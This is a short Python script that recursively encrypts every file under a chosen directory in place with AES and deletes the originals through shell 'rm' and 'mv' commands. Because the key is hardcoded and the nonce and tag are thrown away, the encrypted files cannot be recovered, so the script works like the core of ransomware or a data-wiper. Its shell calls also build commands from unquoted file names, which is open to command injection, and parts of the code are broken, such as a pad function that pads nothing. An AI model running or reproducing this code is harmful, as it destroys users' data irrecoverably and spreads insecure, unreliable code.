#!/usr/local/bin/python3
import base64
import argparse
import logging
import glob
import os
import io
import PIL.Image as Image
import math
import numpy as np
import sys
import time
import itertools
import tqdm

from array import array


from Cryptodome.Cipher import AES
from hashlib import md5

password = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
BLOCK_SIZE = 16

def pad (data):
    pad = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data

def unpad (padded):
    pad = ord(padded[-1])
    return padded[:-pad]

def encrypt_buffer(data, nonce, password):
    t1 = time.perf_counter()
    key = b'Sixteen byte key'
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    #print(f"Encryption time: {time.perf_counter() - t1} s")
    return ciphertext

def readimage(path):
    with open(path, "rb") as f:
        return bytearray(f.read())

def encrypt(filename):
    if os.path.isfile(filename):
        encrypted_buffer = encrypt_buffer(readimage(filename), "", password)
        output_filename = f"{filename}.out"
        with open (output_filename, "wb") as f:
            f.write(encrypted_buffer)
            f.close()
        os.system(f"rm {filename}")
        os.system(f"mv {output_filename} {filename}")
        print(f"Encrypted {filename}")
    return {filename: True}


PARALLEL_JOBS = 128



#-------------------------------------------------------------------------------


def iterate_files(base_dir):
    """
        Iterate over a directory, and for every file that is not a metadata
        file, call process_single_file.

        Metadata files have the following format:
        __metadata_origfname.origextn.json
    """
    savedir = None
    try:
        savedir = os.getcwd()
        os.chdir(base_dir)
        filenames = glob.glob("./**", recursive=True)
        for i in tqdm.tqdm(range(0, len(filenames), PARALLEL_JOBS)):
            list(map(encrypt, filenames[i: i + PARALLEL_JOBS]))
    except Exception as e:
        logging.error(f"Exception in iteration {e}")
        raise e
    finally:
        if savedir is not None:
            os.chdir(savedir)




#-------------------------------------------------------------------------------



def main():
    parser = argparse.ArgumentParser(\
        description="Iterate files and and encrypt them")
    parser.add_argument("--directory", "-d", type=str, required=True)
    args = parser.parse_args()
    iterate_files(args.directory)



#-------------------------------------------------------------------------------



if "__main__" == __name__:
    main()
